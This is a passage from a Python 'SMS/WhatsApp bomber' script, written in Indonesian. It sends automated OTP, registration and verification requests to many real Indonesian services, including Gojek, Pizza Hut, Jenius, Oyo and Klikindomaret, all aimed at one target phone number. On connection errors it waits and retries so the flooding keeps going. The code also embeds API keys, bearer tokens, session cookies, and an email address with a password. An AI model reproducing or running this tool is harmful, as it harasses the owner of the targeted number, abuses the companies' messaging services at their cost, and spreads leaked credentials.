Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.sayurbox.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"})).text
                    Tokko_wa                               =  requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","content-length":"306","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","x-tokko-api-client":"merchant_web","content-type":"application/json","accept":"*/*","x-tokko-api-client-version":"4.5.1","sec-ch-ua-platform":"Android","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
                    Carsome_wa                             =  requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","x-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"A4p3vs1Ixu9wp3wFmCEG9K","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":1})).text
                    Jenius                                 =  requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
                    Alodokter                              =  requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
                    Pizzahut                               =  requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
                    # Kredinesia                             =  requests.post("https://api.kredinesia.id/v1/login/verificationCode",headers={"Host":"api.kredinesia.id","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.kredinesia.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.kredinesia.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"captcha":""})).text
                    # Tokko                                  =  requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
                    # Ginee                                  =  requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},data=json.dumps({"account":"0"+nomor,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})).text
                    Misteraladin                           =  requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text

                    autoketik(f"{hijau}Sukses Spam")
                    countdown(120) # Jangan Diubah !!!!

                except requests.exceptions.ConnectionError: # Error Handling Ketika Request Time Out di salah satu URL API
                    if RTO_flag == 0:
                        print("")
                        autoketik("--Request Time Out--") # Flag ketika memasuki RTO di salah satu URL API
                        print(f"{putih}dialihkan ke Requests Alternatif{hijau}")
            
                    Indo_from30                            =  requests.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP="+nomor, headers={"Host": "account-api-v1.klikindomaret.com","user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","content-type": "application/json","accept": "*/*","origin": "https://account.klikindomaret.com","referer": "https://account.klikindomaret.com/SMSVerification?nohp="+nomor+"&type=register","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}).text
                    Wa2_from30                             =  requests.post("https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==", data={"namaDepan":"Tahalu"+str(random.randrange(11,99999)),"emailNope":nomor,"password":"Indo"+str(random.randrange(111,999)),"konfirmasiPass":"Indo"+str(random.randrange(111,999))}, headers={"Host": "qtva.id","Connection": "keep-alive","Accept": "text/html, */*; q=0.01","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://qtva.id","Referer": "https://qtva.id/page/register/siswa","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"}).text
                    # Call_from30                            =  requests.get("https://id.jagreward.com/member/verify-mobile/"+b+"/", headers={"X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36","Content-Type":" application/x-www-form-urlencoded; charset=UTF-8","Content-Type": "application/json","Origin": "https://id.jagreward.com","Referer": "https://id.jagreward.com/member/register/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816","_ga": "GA1.2.2037151396.1584709855", "PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc","DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",})
                    # Call2_from30                           =  requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=json.dumps({"countryCode":"+62","phoneNumber":b}), headers={"Content-Type": "application/json","Host": "srv3.sampingan.co.id","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/4.4.0"})
                    # Greetday                               =  requests.Session().post('https://seekmi.com/ajax/send-otp', data={ 'phone': nomor,'name': 'YutixCode' }, headers={ 'X-CSRF-TOKEN': bs(requests.Session().get('https://seekmi.com/register').text,'html.parser').findAll('meta')[27]['content'] })
                    # Jadgreward                             =  json.loads(requests.get(f"https://id.jagreward.com/member/verify-mobile/{b}").text)
                    Kredito                                =  requests.post("https://app-api.kredito.id/client/v1/common/verify-code/send",'{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'%(b),headers={"LPR-TIMESTAMP":"1603281035821","Accept-Language":"id-ID","LPR-BRAND":"Kredito","LPR-PLATFORM":"android","User-Agent":"okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android","Authorization":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks","LPR-SIGNATURE":"e15dbea8602409df32a2ed5a123dc244","Content-Type":"application/json; charset=UTF-8","Content-Length":"79"}).text
                    # Maucash                                =  requests.get(f"https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile={b}&channelType=0",headers={"Host":"japi.maucash.id","accept":"application/json, text/plain, */*","x-origin":"google play","x-org-id":"1","x-product-code":"YN-MAUCASH","x-app-version":"2.4.23","x-source-id":"android","accept-encoding":"gzip","user-agent":"okhttp/3.12.1"}).text
                    Gojek                                  =  requests.post("https://api.gojekapi.com/v5/customers", data={"email": "nsjwwiwiwisnsnn12@gmail.com", "name": "akuinginterbang12", "phone":c, "signed_up_country": "ID"},headers={"X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9", "X-Platform": "Android", "X-UniqueId": "8606f4e3b85968fd", "X-AppVersion": "3.52.2", "X-AppId": "com.gojek.app", "Accept": "application/json", "Authorization": "Bearer", "X-User-Type": "customer", "Accept-Language": "id-ID", "X-User-Locale": "id_ID", "Host": "api.gojekapi.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip", "User-Agent": "okhttp/3.12.1"}).text
                    Harvestcake                            =  requests.post("https://harvestcakes.com/register",data={"phone":b},headers={"user-agent":"Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"}).text
                    Oyo                                    =  requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=json.dumps({"phone":b,"country_code": "+62","country_iso_code": "ID","nod": "4","send_otp": "true","devise_role": "Consumer_Guest"}),headers={"Host": "identity-gateway.oyorooms.com","consumer_host": "https://www.oyorooms.com","accept-language": "id","access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=","User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36","Content-Type": "application/json","accept": "*/*","origin": "https://www.oyorooms.com","referer": "https://www.oyorooms.com/login","Accept-Encoding": "gzip,deflate,br"}).text
                    # Tokomanamana                           =  requests.post("https://tokomanamana.com/ma/auth/request_token_merchant/",data={"phone":nomor},headers={"Host": "tokomanamana.com","Connection": "keep-alive","Content-Length": "18","Accept": "*/*","Origin": "https://tokomanamana.com","X-Requested-With": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Referer": "https://tokomanamana.com/ma/register","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,en-US;q=0.8"}).text
                    # MI_metroindonesia                      =  requests.post('http://access.metroindonesia.com/Member/sendpin',data={'phoneno':nomor}).text
                    Foa                                    =  requests.post('https://foreignadmits.com/api/register-otp-generate-student',data={'mobile':f'62{nomor[1:]}','countryCode':'+62'}).text
                    # Matchwatch                             =  requests.post('https://apiv2.jamtangan.com/validateuniqueid', files={'params':(None, nomor),'step':(None, '2'),'type':(None, 'sms')}).text
                    # Tokomanamana                           =  requests.post('https://tokomanamana.com/ma/auth/request_token_merchant/',data={'phone':nomor},headers={'Host': 'tokomanamana.com','Connection': 'keep-alive','Content-Length': '18','Accept': '*/*','Origin': 'https://tokomanamana.com','X-Requested-With': 'XMLHttpRequest','User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','Referer': 'https://tokomanamana.com/ma/register','Accept-Encoding': 'gzip, deflate','Accept-Language': 'id-ID,en-US;q=0.8'})
                    # Harnic                                 =  requests.post('https://harnic.id:443/login/phone_auth_OTP', data={'phone':nomor})
                    #Sayurbox_wa                            =  requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={"Host":"www.sayurbox.com","content-length":"289","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyNjQwMTA4LCJleHAiOjE2NjUyMzIxMDgsImlhdCI6MTY2MjY0MDEwOCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6ImIwYjc1ZjI1LTllZmYtNDJjNS1hNmJiLWMyYjA3ZGI2YjVkOSIsInN1YiI6IllsNzB5YmtVWFl1dmstU3BTbkQ0ODlWX3NGOTIiLCJ1c2VyX2lkIjoiWWw3MHlia1VYWXV2ay1TcFNuRDQ4OVZfc0Y5MiJ9.DCYJRFjl-TTezyjXba-XLOOUK2ppvNBL--ETojGa_UauO0zyaaD090eFaMpglVThj-y3fbFany9eT1qx5y1olulqTGxExI1DsIVN8_Ds6cQuTPaYsBKFwgHZQSnKRkRAP3aEILhzRMsUUG7kwBJWCziTC9nGfBWl7tPwHoYmnerOzsSnTUjCnOfDphMuj_glxHsKDPtIUwie2xi00d0NhMDnc2kyrkJc8xer7XLXWJGzZVvI-3wl72VLcB1GmDVZKo-JX9tAhzO7lsGSXm9G0lSYKD_NUUMKbU7d4w_2Col3Lhu6E0ltyw4nmna8ssc0q8_ti1b9F-HL1GfRzTRa-g","content-type":"application/json","accept":"*/*","x-bundle-revision":"6.0","x-sbox-tenant":"sayurbox","x-binary-version":"2.2.1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://www.sayurbox.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"})).text
                    Tokko_wa                               =  requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","content-length":"306","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","x-tokko-api-client":"merchant_web","content-type":"application/json","accept":"*/*","x-tokko-api-client-version":"4.5.1","sec-ch-ua-platform":"Android","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
                    Carsome_wa                             =  requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","x-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"A4p3vs1Ixu9wp3wFmCEG9K","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":1})).text
                    Jenius                                 =  requests.post("https://api.btpn.com/jenius", json.dumps({"query": "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n","variables": {"phone":"+62"+nomor,"language": "id"},"operationName": "registerPhone"}),headers={"accept": "*/*","btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d","version": "2.36.1-7565","accept-language": "id","x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be","Content-Type": "application/json","Host": "api.btpn.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607","User-Agent": "okhttp/3.12.1"}).text
                    # Alodokter_400xend                      =  requests.post('https://www.alodokter.com/login-with-phone-number', headers={'Host': 'www.alodokter.com','content-length': '33','x-csrf-token': 'UG8hv2kV0R2CatKLXYPzT1isPZuGHVJi8sjnubFFdU1YvsHKrmIyRz6itHgNYuuBbbgSsCmfJWktrsfSC9SaGA==','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','content-type': 'application/json','accept': 'application/json','save-data': 'on','origin': 'https://www.alodokter.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.alodokter.com/login-alodokter','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({"user": {"phone": "0"+nomor}})).text
                    Pizzahut                               =  requests.post('https://api-prod.pizzahut.co.id/customer/v1/customer/register', headers={'Host': 'api-prod.pizzahut.co.id','content-length': '157','x-device-type': 'PC','sec-ch-ua-mobile': '?1','x-platform': 'WEBMOBILE','x-channel': '2','content-type': 'application/json;charset=UTF-8','accept': 'application/json','x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab','user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36','x-lang': 'en','save-data': 'on','x-device-id': 'web','origin': 'https://www.pizzahut.co.id','sec-fetch-site': 'same-site','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://www.pizzahut.co.id/','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en;q=0.8'},data=json.dumps({  "email": "aldigg088@gmail.com",  "first_name": "Xenzi",  "last_name": "Wokwokw",  "password": "Aldi++\\/67",  "phone": "0"+nomor,  "birthday": "2000-01-02"})).text
                    # Kredinesia                             =  requests.post("https://api.kredinesia.id/v1/login/verificationCode",headers={"Host":"api.kredinesia.id","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","origin":"https://www.kredinesia.id","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.kredinesia.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":nomor,"captcha":""})).text
                    # Tokko                                  =  requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","accept-language":"id","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
                    # Ginee                                  =  requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},data=json.dumps({"account":"0"+nomor,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})).text
                    Misteraladin                           =  requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzip, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomor,"type":"register"})).text

                    autoketik(f"{hijau}Sukses Mengirim ")
                    countdown(120) # Jangan Diubah dongo
                    RTO_flag = 1
                    rto = 1 # Flag tunda

                except requests.exceptions.ConnectionError:
                    print("")
                    autoketik("--Fail to establish a new connection--")
                    time.sleep(1000) # Tunda 1000 detik
                    rto = 1

                #https://urllib3.readthedocs.io/en/stable/reference/urllib3.exceptions.html
                except urllib3.exceptions.NewConnectionError: # Error Handling 2 ketika masih terjadi error berlebihan
                    print("")
                    autoketik("--Fail to establish a new connection--")
                    time.sleep(1000) # Tunda 1000 detik
                    rto = 1

                except TimeoutError : # HTTPSConnectionPool() A Connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
                    print("")
                    autoketik("--A Connection attempt failed because the connected party did not properly respond after a period of time--")
                    time.sleep(1000) # Tunda 1000 detik
                    rto = 1

                except urllib3.exceptions.ProtocolError : # HTTPSConnectionPool() A Connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
                    print("")
                    autoketik("--A Connection attempt failed because the connected party did not properly respond after a period of time--")
                    time.sleep(1000) # Tunda 1000 detik
                    rto = 1

                except KeyboardInterrupt: # Error Handling Ketika user menekan tombol CTRL + C atau Interrupt Terminal
                    print("")
                    tanya(nomor)
            if rto==1:
                time.sleep(80) # Jika sudah error RTO maka tunda dulu proses selama 80 detik
                start(nomor,1)
            else:
